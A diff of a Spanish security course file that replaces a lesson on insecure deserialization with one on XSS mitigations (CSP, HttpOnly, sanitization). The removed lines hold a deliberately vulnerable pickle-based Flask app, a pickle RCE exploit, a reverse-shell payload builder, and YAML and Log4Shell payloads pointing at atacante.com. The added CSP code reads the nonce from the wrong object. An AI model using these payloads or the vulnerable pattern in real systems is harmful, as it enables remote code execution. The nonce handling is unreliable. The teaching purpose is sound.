@@ -1,4 +1,4 @@
-# Clase 24: Deserializacion Insegura
+# Clase 24: XSS - Practica y Mitigaciones
 
 **Duracion:** 2 horas
 
@@ -6,956 +6,907 @@
 
 ## Objetivos de Aprendizaje
 
-1. Comprender que es serializacion y deserializacion
-2. Identificar los riesgos de seguridad en diferentes formatos de serializacion
-3. Crear y entender payloads maliciosos en pickle (Python)
-4. Implementar deserializacion segura con validacion de esquema
-5. Conocer las mitigaciones contra ataques de deserializacion
+1. Implementar Content Security Policy (CSP) estricta y relajada
+2. Configurar HttpOnly cookies y entender su funcionamiento
+3. Sanitizar HTML con librerias como bleach y DOMPurify
+4. Identificar y corregir XSS en aplicaciones React
+5. Escribir reglas CSP explicando cada directiva
 
 ---
 
 ## Contenido Detallado
 
-### 1. Que es Serializacion/Deserializacion?
+### 1. Content Security Policy (CSP) en Profundidad
 
-**Serializacion:** Proceso de convertir un objeto en memoria a un formato que pueda ser almacenado o transmitido (bytes, string, XML, JSON).
+CSP es un header HTTP que permite controlar que recursos puede cargar y ejecutar una pagina web. Es la defensa mas efectiva contra XSS.
 
-**Deserializacion:** Proceso inverso: reconstruir el objeto a partir del formato almacenado/transmitido.
+#### Directivas Principales
 
+| Directiva | Controla |
+|-----------|----------|
+| `default-src` | Fallback para todas las directivas no especificadas |
+| `script-src` | Fuentes permitidas para scripts |
+| `style-src` | Fuentes permitidas para hojas de estilo |
+| `img-src` | Fuentes permitidas para imagenes |
+| `connect-src` | URLs permitidas para fetch, XHR, WebSocket |
+| `font-src` | Fuentes permitidas para tipografias |
+| `frame-src` | Fuentes permitidas para iframes |
+| `frame-ancestors` | Quien puede incrustar la pagina en un iframe |
+| `form-action` | URLs permitidas como destinos de formularios |
+| `base-uri` | URLs permitidas para el tag `<base>` |
+| `object-src` | Fuentes permitidas para plugins (Flash, Java) |
+| `report-uri` / `report-to` | URL donde enviar reportes de violaciones CSP |
+
+#### Keywords Especiales
+
+| Keyword | Significado |
+|---------|-------------|
+| `'none'` | No permite nada |
+| `'self'` | Solo el mismo origen (protocolo + dominio + puerto) |
+| `'unsafe-inline'` | Permite scripts/styles inline (reduce seguridad) |
+| `'unsafe-eval'` | Permite `eval()`, `setTimeout(string)`, `new Function()` |
+| `'strict-dynamic'` | Permite scripts cargados por scripts confiables |
+| `'nonce-<valor>'` | Permite scripts con el nonce correcto (recomendado) |
+| `<hash-algo>-<hash>` | Permite script cuyo hash coincida (sha256, sha384, sha512) |
+
+#### CSP Estricta vs. Relajada
+
+**CSP Estricta (recomendada para produccion):**
 ```
-Objeto en memoria ──Serializar──>  Bytes / String / JSON / XML
-Bytes / String / JSON / XML  ──Deserializar──>  Objeto en memoria
+default-src 'none';
+script-src 'self' 'nonce-RANDOM';
+style-src 'self';
+img-src 'self';
+connect-src 'self';
+frame-ancestors 'none';
+form-action 'self';
+base-uri 'self';
+object-src 'none';
 ```
 
-### 2. Formatos de Serializacion
+**CSP Relajada (para desarrollo o migracion):**
+```
+default-src 'self';
+script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com;
+style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+img-src 'self' data: https:;
+font-src 'self' https://fonts.gstatic.com;
+connect-src 'self' ws: wss:;
+```
 
-| Formato | Lenguaje | Seguro? | Notas |
-|---------|----------|---------|-------|
-| **pickle** | Python | NO | Ejecuta codigo arbitrario al deserializar |
-| **Java serialization** | Java | NO | Puede ejecutar codigo via gadget chains |
-| **PHP unserialize** | PHP | NO | Permite RCE via gadget chains |
-| **YAML** | Multiples | NO | Puede ejecutar codigo con tags peligrosos |
-| **JSON** | Universal | SI | Solo datos, no ejecuta codigo |
-| **XML** | Universal | Parcial | Seguro si se deshabilitan DTD/entidades |
-| **MessagePack** | Multiples | Generalmente seguro | No ejecuta codigo directamente |
-| **Protocol Buffers** | Multiples | Seguro | Formato binario estricto |
-| **CBOR** | Multiples | Generalmente seguro | Similar a JSON |
+### 2. HttpOnly Cookies
 
-### 3. Ataques por Formato
+La flag `HttpOnly` en una cookie impide que JavaScript del lado del cliente acceda a ella mediante `document.cookie`. Esto protege contra el robo de cookies via XSS.
 
-#### pickle (Python)
-
-pickle permite ejecutar codigo arbitrario durante la deserializacion porque esta disenado para reconstruir objetos Python, incluyendo clases y funciones arbitrarias.
+**Como configurar HttpOnly:**
 
 ```python
-import pickle
-import os
+# Flask
+response.set_cookie('session_id', value='abc123', httponly=True, secure=True, samesite='Lax')
 
-# Payload malicioso que ejecuta whoami
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('whoami',))
+# Django
+SESSION_COOKIE_HTTPONLY = True
+SESSION_COOKIE_SECURE = True
+SESSION_COOKIE_SAMESITE = 'Lax'
 
-payload = pickle.dumps(Exploit())
-
-# Al deserializar, se ejecuta whoami
-pickle.loads(payload)  # Ejecuta: whoami
+# Express (Node.js)
+res.cookie('session_id', 'abc123', { httpOnly: true, secure: true, sameSite: 'Lax' });
 ```
 
-#### Java Serialization
+**Flags de cookies:**
 
-Java serialization puede ser explotada mediante "gadget chains": combinaciones de clases disponibles en el classpath que, al ser deserializadas, ejecutan codigo arbitrario.
+| Flag | Descripcion |
+|------|-------------|
+| `HttpOnly` | Inaccesible via JavaScript |
+| `Secure` | Solo se envia por HTTPS |
+| `SameSite=Lax` | No se envia en requests cross-site (protege CSRF) |
+| `SameSite=Strict` | No se envia en ningun contexto cross-site |
+| `Max-Age` / `Expires` | Tiempo de vida de la cookie |
+
+### 3. Sanitizacion
+
+#### Python: bleach
+
+```python
+import bleach
+
+# Permite solo tags y atributos seguros
+allowed_tags = ['p', 'b', 'i', 'u', 'a', 'strong', 'em', 'br', 'ul', 'ol', 'li']
+allowed_attrs = {'a': ['href', 'title'], 'img': ['src', 'alt']}
+
+safe_html = bleach.clean(user_input,
+    tags=allowed_tags,
+    attributes=allowed_attrs,
+    strip=True  # Eliminar tags no permitidos
+)
+```
+
+#### JavaScript: DOMPurify
+
+```javascript
+// DOMPurify - sanitizacion en el lado del cliente
+import DOMPurify from 'dompurify';
+
+const dirty = '<img src=x onerror=alert(1)><p>Texto seguro</p>';
+const clean = DOMPurify.sanitize(dirty);
+// Resultado: '<p>Texto seguro</p>'
+```
+
+#### Java: OWASP Java Encoder
 
 ```java
-// Ejemplo conceptual (simplificado)
-// CommonsCollections1 es una gadget chain clasica
-ObjectInputStream ois = new ObjectInputStream(new FileInputStream("payload.ser"));
-Object obj = ois.readObject();  // Ejecuta codigo si el payload usa gadgets
+import org.owasp.encoder.Encode;
+
+// Para contexto HTML
+String safeHTML = Encode.forHtml(userInput);
+
+// Para contexto de atributo HTML
+String safeAttr = Encode.forHtmlAttribute(userInput);
+
+// Para contexto JavaScript
+String safeJS = Encode.forJavaScript(userInput);
+String safeJSBlock = Encode.forJavaScriptBlock(userInput);
+
+// Para contexto URL
+String safeURL = Encode.forUriComponent(userInput);
+
+// Para contexto CSS
+String safeCSS = Encode.forCssString(userInput);
 ```
 
-**Gadgets famosos:**
-- CommonsCollections (Apache Commons Collections)
-- Spring beans
-- JDK built-in (URLDNS, Runtime)
-- FastJSON, Jackson (polymorphic type handling)
+### 4. Plantillas Seguras
 
-#### YAML
+#### Jinja2 (Flask)
 
-YAML permite definir tipos personalizados con `!!`, que pueden ejecutar codigo.
+Jinja2 tiene autoescape habilitado por defecto en archivos `.html`. Escapa `<`, `>`, `&`, `"`, `'`.
 
-```yaml
-# Payload YAML peligroso
-!!javax.script.ScriptEngineManager [
-  !!java.net.URLClassLoader [
-    [!!java.net.URL ["http://atacante.com/evil.jar"]]
-  ]
-]
+```html
+<!-- SEGURO: autoescape activo por defecto -->
+<p>{{ usuario_input }}</p>
+
+<!-- Si NECESITAS HTML (cuidado): usar |safe solo si confias -->
+<p>{{ contenido_confiable|safe }}</p>
+
+<!-- Desactivar autoescape para bloques especificos -->
+{% autoescape false %}
+{{ contenido_inseguro }}  <!-- PELIGROSO -->
+{% endautoescape %}
 ```
 
-### 4. Log4Shell (CVE-2021-44228)
+#### React JSX
 
-Aunque no es estrictamente deserializacion, Log4Shell es un ataque relacionado donde Log4j procesa JNDI lookups desde mensajes de log, permitiendo RCE.
+React escapa automaticamente todo valor insertado con `{}`.
 
-```
-Payload: ${jndi:ldap://atacante.com/a}
-```
-
-Log4j deserializa datos de un servidor LDAP controlado por el atacante, ejecutando codigo arbitrario.
-
-### 5. Mitigaciones
-
-| Mitigacion | Descripcion |
-|------------|-------------|
-| **No usar formatos peligrosos** | Preferir JSON sobre pickle, Java serialization, YAML |
-| **Validacion de esquema** | Validar datos contra un esquema fijo antes de deserializar |
-| **Firmas digitales** | Firmar datos serializados para verificar integridad y origen |
-| **Librerias seguras** | Usar `json` en vez de `pickle`, `yaml.safe_load()` en vez de `yaml.load()` |
-| **Lista blanca de clases** | Permitir solo clases conocidas y seguras durante la deserializacion |
-| **Sandboxing** | Deserializar en entornos aislados (contenedores, sandbox) |
-| **No aceptar datos serializados de fuentes no confiables** | Es la mitigacion mas simple y efectiva |
-
----
-
-## Ejercicio 1: Crear y Explotar Payload Malicioso en Pickle
-
-### Escenario
-
-Una aplicacion Python usa pickle para serializar la sesion del usuario. Crear un payload que ejecute un comando del sistema.
-
-**Aplicacion vulnerable:**
-
-```python
-"""
-app_pickle_vulnerable.py - App que usa pickle para sesiones (vulnerable)
-"""
-from flask import Flask, request, jsonify, session
-import pickle
-import base64
-
-app = Flask(__name__)
-
-# SIMULACION PELIGROSA: Usar pickle para serializar datos de sesion
-# Esto es intencionalmente inseguro para fines educativos
-
-def deserialize_session(session_data_b64):
-    """Deserializa datos de sesion desde base64"""
-    try:
-        session_data = base64.b64decode(session_data_b64)
-        return pickle.loads(session_data)  # VULNERABLE: pickle.loads en datos no confiables
-    except Exception as e:
-        return {'error': str(e)}
-
-@app.route('/api/datos')
-def get_datos():
-    # Simular recepcion de cookie serializada
-    session_cookie = request.cookies.get('session_data', '')
-
-    if not session_cookie:
-        return jsonify({'error': 'No session data'}), 401
-
-    user_data = deserialize_session(session_cookie)
-    return jsonify(user_data)
-
-@app.route('/api/login')
-def login():
-    # Simular login que crea sesion serializada con pickle
-    user_data = {
-        'username': 'usuario_ejemplo',
-        'role': 'user',
-        'id': 123
-    }
-    serialized = base64.b64encode(pickle.dumps(user_data)).decode('utf-8')
-
-    response = jsonify({'mensaje': 'Login exitoso', 'session': serialized})
-    response.set_cookie('session_data', serialized, httponly=True)
-    return response
-
-if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=5000)
-```
-
-**Script de explotacion:**
-
-```python
-"""
-exploit_pickle.py - Genera payload malicioso para pickle
-"""
-import pickle
-import base64
-import os
-import subprocess
-
-# ============================================================
-# CLASE EXPLOIT
-# ============================================================
-
-class RCE:
-    """Clase que ejecuta un comando al ser deserializada"""
-    def __reduce__(self):
-        """
-        __reduce__ es un metodo especial que pickle usa para
-        determinar como reconstruir un objeto.
-        Retorna: (callable, args)
-        - callable: la funcion a ejecutar
-        - args: tupla de argumentos para la funcion
-        """
-        return (os.system, ('whoami',))
-
-    def __str__(self):
-        return "Payload malicioso de pickle"
-
-
-# ============================================================
-# GENERAR PAYLOAD
-# ============================================================
-
-def generate_pickle_payload(command='whoami'):
-    """Genera un payload pickle que ejecuta un comando"""
-    class DynamicRCE:
-        def __reduce__(self):
-            return (os.system, (command,))
-
-    payload_bytes = pickle.dumps(DynamicRCE())
-    payload_b64 = base64.b64encode(payload_bytes).decode('utf-8')
-    return payload_b64
-
-
-def generate_reverse_shell_payload(ip, port):
-    """Genera payload para reverse shell (simulado/educativo)"""
-    command = f'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'
-    return generate_pickle_payload(command)
-
-
-# ============================================================
-# EXPLOTACION
-# ============================================================
-
-def exploit_vulnerable_app():
-    """Demostracion de explotacion contra app vulnerable"""
-    import requests
-
-    base_url = "http://127.0.0.1:5000"
-
-    # 1. Primero, login normal para ver el formato
-    print("[*] Obteniendo sesion normal...")
-    r = requests.get(f"{base_url}/api/login")
-    normal_session = r.cookies.get('session_data', '')
-    if normal_session:
-        print(f"[+] Sesion normal obtenida: {normal_session[:50]}...")
-
-    # 2. Generar payload malicioso
-    print("\n[*] Generando payload malicioso...")
-    payload = generate_pickle_payload('whoami')
-    print(f"[+] Payload: {payload}")
-
-    # 3. Enviar payload como cookie
-    print("\n[*] Enviando payload malicioso al servidor...")
-    r = requests.get(
-        f"{base_url}/api/datos",
-        cookies={'session_data': payload}
-    )
-    print(f"[+] Respuesta del servidor: {r.text}")
-
-    # 4. Payload para comando personalizado
-    print("\n[*] Probando payload para listar directorio...")
-    ls_payload = generate_pickle_payload('dir' if os.name == 'nt' else 'ls -la')
-    r = requests.get(
-        f"{base_url}/api/datos",
-        cookies={'session_data': ls_payload}
-    )
-    print(f"[+] Respuesta del servidor: {r.text}")
-
-
-# ============================================================
-# DEMOSTRACION LOCAL
-# ============================================================
-
-def demo_pickle_local():
-    """Demostracion local de como pickle ejecuta codigo"""
-    print("=" * 60)
-    print("DEMOSTRACION: pickle ejecuta codigo al deserializar")
-    print("=" * 60)
-
-    # Crear payload malicioso
-    payload_bytes = pickle.dumps(RCE())
-    print(f"\n[+] Payload serializado: {payload_bytes.hex()[:60]}...")
-
-    print("\n[!] Deserializando payload... (se ejecutara 'whoami')")
-    print("[!] ESTO ES PELIGROSO - No hacer en produccion")
-    print("-" * 40)
-
-    try:
-        # AL DESERIALIZAR, SE EJECUTA EL COMANDO
-        obj = pickle.loads(payload_bytes)
-        print(f"\n[+] Objeto deserializado: {obj}")
-    except Exception as e:
-        print(f"\n[-] Error: {e}")
-
-
-def demo_safe_deserialization():
-    """Demostracion de como deserializar pickle de forma segura"""
-    print("\n" + "=" * 60)
-    print("DESERIALIZACION SEGURA (limitada)")
-    print("=" * 60)
-
-    # Restringir que clases pueden ser deserializadas
-    import builtins
-
-    class SafeUnpickler(pickle.Unpickler):
-        """Unpickler que solo permite clases seguras"""
-
-        ALLOWED_CLASSES = {
-            'builtins.dict': dict,
-            'builtins.list': list,
-            'builtins.str': str,
-            'builtins.int': int,
-            'builtins.float': float,
-            'builtins.bool': bool,
-            'builtins.tuple': tuple,
-            'builtins.set': set,
-            'builtins.NoneType': type(None),
-        }
-
-        def find_class(self, module, name):
-            """Sobreescribe find_class para restringir clases permitidas"""
-            full_name = f"{module}.{name}"
-            if full_name not in self.ALLOWED_CLASSES:
-                raise pickle.UnpicklingError(
-                    f"Clase no permitida: {full_name}"
-                )
-            return self.ALLOWED_CLASSES[full_name]
-
-    # Intentar deserializar payload malicioso
-    payload = pickle.dumps(RCE())
-
-    try:
-        # Esto fallara porque RCE no esta en la lista blanca
-        safe_unpickler = SafeUnpickler(io.BytesIO(payload))
-        obj = safe_unpickler.load()
-        print(f"[-] Deserializacion exitosa (inesperado): {obj}")
-    except pickle.UnpicklingError as e:
-        print(f"[+] Clase maliciosa bloqueada: {e}")
-    except Exception as e:
-        print(f"[+] Payload malicioso detectado: {e}")
-
-
-if __name__ == '__main__':
-    import io
-
-    print("\n=== EJERCICIO: Pickle RCE ===\n")
-
-    # Demo local
-    demo_pickle_local()
-    print()
-
-    # Demostracion de lista blanca
-    demo_safe_deserialization()
-
-    print("\n=== EXPLOTACION CONTRA SERVIDOR ===")
-    print("Para explotar el servidor, ejecutar:")
-    print("1. Iniciar servidor: python app_pickle_vulnerable.py")
-    print("2. Ejecutar exploit: python -c 'from exploit_pickle import *; exploit_vulnerable_app()'")
-```
-
----
-
-## Ejercicio 2: Deserializacion Segura en Python con JSON y Validacion de Esquema
-
-### Escenario
-
-Reemplazar pickle con JSON y agregar validacion de esquema usando una libreria como `jsonschema` o validacion manual.
-
-```python
-"""
-safe_deserialization.py - Deserializacion segura con JSON y esquema
-"""
-from flask import Flask, request, jsonify
-import json
-import hmac
-import hashlib
-import os
-from typing import Any, Dict, Optional
-
-app = Flask(__name__)
-
-# ============================================================
-# CONFIGURACION
-# ============================================================
-
-# Clave secreta para firmar tokens (NUNCA hardcodear en produccion)
-SECRET_KEY = os.urandom(32).hex()
-app.config['SECRET_KEY'] = SECRET_KEY
-
-# Esquema de datos de sesion permitido
-SESSION_SCHEMA = {
-    'username': str,
-    'user_id': int,
-    'role': str,
-    'email': str,
-    'created_at': str,
+```jsx
+// SEGURO: React escapa automaticamente
+function Comentario({ texto }) {
+    return <div>{texto}</div>;  // texto se escapa, no se interpreta como HTML
 }
 
-ROLES_PERMITIDOS = {'admin', 'user', 'viewer'}
+// PELIGROSO: dangerouslySetInnerHTML
+function ComentarioRaw({ html }) {
+    return <div dangerouslySetInnerHTML={{ __html: html }} />;
+}
 
+// SEGURO si necesitas renderizar HTML: usar DOMPurify
+import DOMPurify from 'dompurify';
+
+function ComentarioSeguro({ html }) {
+    const clean = DOMPurify.sanitize(html);
+    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+```
+
+### 5. X-XSS-Protection (Obsoleto en Chromium)
+
+El header `X-XSS-Protection` activaba el filtro XSS integrado de IE/Edge/Chrome (antiguo). Chrome eliminó este filtro en 2019 porque introducia vulnerabilidades adicionales.
+
+```http
+X-XSS-Protection: 1; mode=block
+```
+
+Actualmente se recomienda usar CSP en lugar de confiar en X-XSS-Protection.
+
+---
+
+## Ejercicio 1: Implementar CSP en Flask para Bloquear XSS
+
+### Escenario
+
+Implementar CSP headers en una aplicacion Flask que tiene un formulario de busqueda y un panel de administracion.
+
+```python
+"""
+app_csp.py - Implementacion completa de CSP en Flask
+"""
+from flask import Flask, request, jsonify, make_response, render_template_string
+import os
+import secrets
+import logging
+
+app = Flask(__name__)
 
 # ============================================================
-# VALIDACION DE ESQUEMA
+# CONFIGURACION CSP
 # ============================================================
 
-def validate_session_data(data: Dict[str, Any]) -> bool:
+class CSPBuilder:
+    """Construye politica CSP segura con nonce"""
+
+    def __init__(self):
+        self.directives = {}
+
+    def add(self, directive, *values):
+        """Agrega una directiva CSP"""
+        if directive not in self.directives:
+            self.directives[directive] = []
+        self.directives[directive].extend(values)
+
+    def build(self):
+        """Construye el string de politica CSP"""
+        parts = []
+        for directive, values in self.directives.items():
+            if values:
+                parts.append(f"{directive} {' '.join(values)}")
+            else:
+                parts.append(directive)
+        return "; ".join(parts)
+
+
+def get_csp_policy(nonce):
     """
-    Valida que los datos cumplan con el esquema esperado.
-    Retorna True si son validos, False en caso contrario.
+    Construye una politica CSP estricta con nonce.
+    Explicacion de cada directiva:
     """
-    if not isinstance(data, dict):
-        return False
+    csp = CSPBuilder()
 
-    # Verificar que todos los campos requeridos esten presentes
-    for field, field_type in SESSION_SCHEMA.items():
-        if field not in data:
-            print(f"Campo faltante: {field}")
-            return False
-        if not isinstance(data[field], field_type):
-            print(f"Tipo incorrecto para {field}: esperado {field_type}, obtenido {type(data[field])}")
-            return False
+    # default-src 'none': Por defecto no permitir nada.
+    # Cada recurso debe ser explicitamente permitido.
+    csp.add("default-src", "'none'")
 
-    # Validar valores especificos
-    if data['role'] not in ROLES_PERMITIDOS:
-        print(f"Rol no permitido: {data['role']}")
-        return False
+    # script-src 'self' 'nonce-...': Solo scripts del mismo origen
+    # o con el nonce correcto en el atributo <script nonce="...">
+    # Esto bloquea XSS porque el atacante no puede adivinar el nonce.
+    csp.add("script-src", "'self'", f"'nonce-{nonce}'")
 
-    if data['user_id'] <= 0:
-        print(f"User ID invalido: {data['user_id']}")
-        return False
+    # style-src 'self': Solo estilos del mismo origen.
+    # No permitir 'unsafe-inline' para evitar CSS injection.
+    # Si necesitas estilos inline, agregar 'unsafe-inline' o usar nonce.
+    csp.add("style-src", "'self'")
 
-    if not isinstance(data['username'], str) or len(data['username']) < 1:
-        print("Username invalido")
-        return False
+    # img-src 'self': Solo imagenes del mismo origen.
+    # Bloquea imagenes como vectores de exfiltracion.
+    csp.add("img-src", "'self'")
 
-    return True
+    # font-src 'self': Solo tipografias del mismo origen.
+    csp.add("font-src", "'self'")
+
+    # connect-src 'self': Solo conexiones XHR/fetch al mismo origen.
+    # Bloquea exfiltracion de datos via fetch/XHR.
+    csp.add("connect-src", "'self'")
+
+    # frame-ancestors 'none': Previene que la pagina sea cargada
+    # en iframes (protege contra clickjacking).
+    csp.add("frame-ancestors", "'none'")
+
+    # form-action 'self': Solo formularios pueden enviar datos al mismo origen.
+    # Bloquea phishing que envia datos a servidor del atacante.
+    csp.add("form-action", "'self'")
+
+    # base-uri 'self': Solo el mismo origen puede ser base URI.
+    # Previene ataques de base URI injection.
+    csp.add("base-uri", "'self'")
+
+    # object-src 'none': Bloquea plugins (Flash, Java, ActiveX).
+    csp.add("object-src", "'none'")
+
+    return csp.build()
 
 
-def validate_extra_data(data: Dict[str, Any]) -> bool:
+def get_relaxed_csp_policy(nonce):
+    """Politica CSP relajada para desarrollo/testing"""
+    return (
+        "default-src 'self'; "
+        f"script-src 'self' 'nonce-{nonce}' 'unsafe-eval' https://cdnjs.cloudflare.com; "
+        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
+        "img-src 'self' data: https:; "
+        "font-src 'self' https://fonts.gstatic.com; "
+        "connect-src 'self' ws: wss:; "
+        "frame-ancestors 'none'; "
+        "form-action 'self'; "
+        "base-uri 'self'; "
+        "object-src 'none'"
+    )
+
+
+# ============================================================
+# MIDDLEWARE CSP
+# ============================================================
+
+@app.after_request
+def add_csp(response):
+    """Agrega CSP header a todas las respuestas HTML"""
+    if response.content_type and 'text/html' in response.content_type:
+        # Generar nonce aleatorio para cada request
+        nonce = secrets.token_hex(16)
+        csp = get_csp_policy(nonce)
+
+        response.headers['Content-Security-Policy'] = csp
+        # Almacenar nonce para usarlo en templates
+        response.nonce = nonce
+
+    # Otros security headers
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'DENY'
+    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
+
+    return response
+
+
+# ============================================================
+# RUTAS
+# ============================================================
+
+@app.route('/')
+def index():
+    """Pagina principal con CSP nonce"""
+    # Obtener nonce del response
+    nonce = request.nonce if hasattr(request, 'nonce') else ''
+
+    template = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>App Segura con CSP</title>
+        <style nonce="{{ nonce }}">
+            body { font-family: Arial; margin: 40px; }
+            .safe { color: green; }
+            .container { max-width: 600px; margin: auto; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1 class="safe">CSP Activo</h1>
+            <p>Esta pagina tiene Content Security Policy con nonce.</p>
+
+            <h2>Buscar:</h2>
+            <form method="GET" action="/buscar">
+                <input type="text" name="q" placeholder="Ingrese busqueda">
+                <input type="submit" value="Buscar">
+            </form>
+
+            <script nonce="{{ nonce }}">
+                // Este script se ejecuta porque tiene el nonce correcto
+                console.log('Script con nonce ejecutado');
+                document.getElementById('mensaje').textContent = 'CSP funcionando correctamente';
+            </script>
+
+            <p id="mensaje"></p>
+        </div>
+    </body>
+    </html>
     """
-    Verifica que no haya campos adicionales no esperados.
-    Esto previene que el atacante inyecte datos arbitrarios.
+    response = make_response(render_template_string(template, nonce=nonce))
+    return response
+
+
+@app.route('/buscar')
+def buscar():
+    query = request.args.get('q', '')
+    nonce = request.nonce if hasattr(request, 'nonce') else ''
+
+    # Escapar el input para prevenir XSS
+    from html import escape
+    safe_query = escape(query)
+
+    template = """
+    <!DOCTYPE html>
+    <html>
+    <head><title>Resultados de busqueda</title></head>
+    <body>
+        <h1>Resultados de busqueda</h1>
+        <p>Buscaste: {{ query }}</p>
+        <p>
+            <!-- Intento de XSS: si inyectas <script>, CSP lo bloquea -->
+            Tu busqueda se muestra de forma segura gracias a CSP y escape.
+        </p>
+        <a href="/">Volver</a>
+    </body>
+    </html>
     """
-    allowed_fields = set(SESSION_SCHEMA.keys())
-    actual_fields = set(data.keys())
-
-    extra_fields = actual_fields - allowed_fields
-    if extra_fields:
-        print(f"Campos no permitidos: {extra_fields}")
-        return False
-
-    return True
+    response = make_response(render_template_string(template, query=safe_query, nonce=nonce))
+    return response
 
 
-# ============================================================
-# FIRMAS DIGITALES
-# ============================================================
-
-def sign_data(data: Dict[str, Any]) -> str:
-    """Firma los datos con HMAC-SHA256 para detectar manipulacion"""
-    serialized = json.dumps(data, sort_keys=True, separators=(',', ':'))
-    signature = hmac.new(
-        SECRET_KEY.encode('utf-8'),
-        serialized.encode('utf-8'),
-        hashlib.sha256
-    ).hexdigest()
-    return signature
-
-
-def verify_signature(data: Dict[str, Any], signature: str) -> bool:
-    """Verifica la firma de los datos"""
-    expected = sign_data(data)
-    # Usar compare_digest para prevenir timing attacks
-    return hmac.compare_digest(expected, signature)
+@app.route('/api/reporte-csp', methods=['POST'])
+def reporte_csp():
+    """
+    Endpoint que recibe reportes de violaciones CSP.
+    Configurar report-uri / report-to para recibir estos reportes.
+    """
+    report = request.get_json(silent=True)
+    if report:
+        app.logger.warning(f"Violacion CSP detectada: {report}")
+        # En produccion, enviar a SIEM o sistema de monitoreo
+    return jsonify({'status': 'recibido'}), 200
 
 
 # ============================================================
-# API SEGURA
+# DEMOSTRACION: Intento de XSS bloqueado por CSP
 # ============================================================
 
-@app.route('/api/session/create', methods=['POST'])
-def create_session():
-    """Crea una sesion segura firmada"""
-    data = request.get_json()
+@app.route('/demo')
+def demo():
+    """Pagina que demuestra como CSP bloquea XSS"""
+    nonce = request.nonce if hasattr(request, 'nonce') else ''
 
-    if not data:
-        return jsonify({'error': 'Datos invalidos'}), 400
+    template = """
+    <!DOCTYPE html>
+    <html>
+    <head><title>Demo CSP vs XSS</title></head>
+    <body>
+        <h1>Demostracion: CSP bloquea XSS</h1>
 
-    # Validar esquema
-    if not validate_session_data(data):
-        return jsonify({'error': 'Datos de sesion invalidos'}), 400
+        <h2>1. Script inline SIN nonce (bloqueado):</h2>
+        <script>alert('XSS sin nonce - BLOQUEADO');</script>
+        <p style="color:gray">Este script no se ejecuta (no tiene nonce)</p>
 
-    if not validate_extra_data(data):
-        return jsonify({'error': 'Campos adicionales no permitidos'}), 400
+        <h2>2. Script inline CON nonce (permitido):</h2>
+        <script nonce="{{ nonce }}">
+            console.log('Script con nonce - PERMITIDO');
+        </script>
+        <p style="color:green">Este script se ejecuta (tiene nonce valido)</p>
 
-    try:
-        # Serializar a JSON
-        serialized = json.dumps(data, separators=(',', ':'))
+        <h2>3. Event handler inline (bloqueado):</h2>
+        <button onclick="alert('Click - BLOQUEADO')">Click me</button>
+        <p style="color:gray">Los event handlers inline son bloqueados</p>
 
-        # Firmar los datos
-        signature = sign_data(data)
-
-        # Devolver token seguro
-        return jsonify({
-            'token': serialized,
-            'signature': signature,
-            'format': 'json_signed',
-            'mensaje': 'Sesion creada de forma segura'
-        })
-
-    except Exception as e:
-        return jsonify({'error': f'Error creando sesion: {str(e)}'}), 500
-
-
-@app.route('/api/session/verify', methods=['POST'])
-def verify_session():
-    """Verifica y deserializa una sesion segura"""
-    data = request.get_json()
-    token = data.get('token', '') if data else ''
-    signature = data.get('signature', '') if data else ''
-
-    if not token or not signature:
-        return jsonify({'error': 'Token y signature requeridos'}), 400
-
-    try:
-        # 1. Deserializar JSON
-        session_data = json.loads(token)
-
-        # 2. Verificar que es un diccionario
-        if not isinstance(session_data, dict):
-            return jsonify({'error': 'Formato de token invalido'}), 400
-
-        # 3. Verificar firma
-        if not verify_signature(session_data, signature):
-            return jsonify({'error': 'Firma invalida - token manipulado'}), 403
-
-        # 4. Validar esquema
-        if not validate_session_data(session_data):
-            return jsonify({'error': 'Datos de sesion invalidos'}), 400
-
-        # 5. Validar campos extra
-        if not validate_extra_data(session_data):
-            return jsonify({'error': 'Campos adicionales no permitidos'}), 400
-
-        return jsonify({
-            'valid': True,
-            'session': {
-                'username': session_data['username'],
-                'user_id': session_data['user_id'],
-                'role': session_data['role'],
-            },
-            'mensaje': 'Sesion verificada correctamente'
-        })
-
-    except json.JSONDecodeError:
-        return jsonify({'error': 'JSON invalido'}), 400
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-
-@app.route('/api/session/info')
-def session_info():
-    """Endpoint informativo"""
-    return jsonify({
-        'formato': 'JSON con validacion de esquema y firma HMAC-SHA256',
-        'campos_permitidos': list(SESSION_SCHEMA.keys()),
-        'roles_permitidos': list(ROLES_PERMITIDOS),
-        'mitigaciones': [
-            'Formato JSON (no ejecuta codigo)',
-            'Validacion de esquema estricta (tipos y valores)',
-            'Firma HMAC-SHA256 contra manipulacion',
-            'Rechazo de campos adicionales',
-            'Validacion de roles permitidos',
-        ]
-    })
-
-
-# ============================================================
-# PRUEBAS
-# ============================================================
-
-def run_tests():
-    """Pruebas automatizadas"""
-    import requests
-
-    base = "http://127.0.0.1:5000"
-
-    def test(name, endpoint, data, expected_status):
-        r = requests.post(f"{base}{endpoint}", json=data)
-        status = "PASS" if r.status_code == expected_status else "FAIL"
-        print(f"[{status}] {name} (status: {r.status_code}, esperado: {expected_status})")
-        if status == "FAIL":
-            print(f"  Respuesta: {r.text[:100]}")
-        return r
-
-    # Test 1: Crear sesion valida
-    test("Crear sesion valida", "/api/session/create", {
-        'username': 'juanperez',
-        'user_id': 123,
-        'role': 'user',
-        'email': 'juan@example.com',
-        'created_at': '2024-01-15T10:30:00',
-    }, 200)
-
-    # Test 2: Sesion con rol invalido
-    test("Rol invalido", "/api/session/create", {
-        'username': 'admin',
-        'user_id': 1,
-        'role': 'superadmin',
-        'email': 'admin@test.com',
-        'created_at': '2024-01-15',
-    }, 400)
-
-    # Test 3: Sesion con campo adicional
-    test("Campo adicional", "/api/session/create", {
-        'username': 'test',
-        'user_id': 1,
-        'role': 'user',
